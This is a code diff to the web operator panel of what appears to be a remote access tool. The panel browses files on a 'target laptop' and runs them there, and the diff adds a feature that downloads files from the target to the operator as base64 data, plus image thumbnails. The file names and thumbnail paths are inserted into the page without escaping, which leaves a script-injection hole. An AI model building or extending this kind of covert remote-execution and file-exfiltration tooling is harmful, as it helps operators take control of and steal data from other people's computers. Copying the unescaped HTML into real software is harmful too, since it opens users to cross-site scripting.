@@ -226,18 +226,25 @@
                 const tr = document.createElement('tr');
                 tr.style.borderBottom = "1px solid #444";
                 
-                const icon = f.isDirectory ? "📁" : "📄";
+                let iconHtml = f.isDirectory ? "📁" : "📄";
+                if (f.thumbnail) {
+                    iconHtml = `<img src="${f.thumbnail}" style="width: 40px; height: 40px; object-fit: cover; border-radius: 4px; vertical-align: middle;">`;
+                }
+
                 const type = f.isDirectory ? "Folder" : "File";
                 
                 let actionBtn = "";
                 if (f.isDirectory) {
                     actionBtn = `<button onclick="requestFiles('${f.path.replace(/\\/g, '\\\\')}')" style="background: #007bff; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer;">Open</button>`;
                 } else {
-                    actionBtn = `<button onclick="openRemoteFile('${f.path.replace(/\\/g, '\\\\')}')" style="background: #28a745; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer;">Execute</button>`;
+                    actionBtn = `
+                        <button onclick="openRemoteFile('${f.path.replace(/\\/g, '\\\\')}')" style="background: #28a745; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer; margin-right: 5px;">Execute</button>
+                        <button onclick="downloadRemoteFile('${f.path.replace(/\\/g, '\\\\')}')" style="background: #17a2b8; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer;">Download</button>
+                    `;
                 }
 
                 tr.innerHTML = `
-                    <td style="padding: 10px; cursor: pointer;">${icon} ${f.name}</td>
+                    <td style="padding: 10px; cursor: pointer;">${iconHtml} <span style="vertical-align: middle; margin-left: 5px;">${f.name}</span></td>
                     <td style="padding: 10px; color: #aaa;">${type}</td>
                     <td style="padding: 10px;">${actionBtn}</td>
                 `;
@@ -251,11 +258,30 @@
         });
 
         window.openRemoteFile = (path) => {
-            if(confirm("Are you sure you want to run/open this file directly on the target laptop?\n\nFile: " + path)) {
+            if(confirm("Are you sure you want to run/open this file directly on the target laptop?\\n\\nFile: " + path)) {
                 socket.emit('open-file', { targetId: activeTarget, path: path });
                 alert("Execution request sent! The file will open on the target laptop.");
             }
         };
+
+        window.downloadRemoteFile = (path) => {
+            alert("Download requested. Please wait while the file is retrieved...");
+            socket.emit('download-file', { targetId: activeTarget, path: path });
+        };
+
+        socket.on('download-result', (data) => {
+            if (data.error) {
+                alert("Download failed: " + data.error);
+                return;
+            }
+            // Trigger native browser download
+            const link = document.createElement('a');
+            link.href = `data:${data.mime};base64,${data.data}`;
+            link.download = data.name;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        });
 
         document.getElementById('backBtn').onclick = () => {
             document.getElementById('clientsList').classList.remove('hidden');
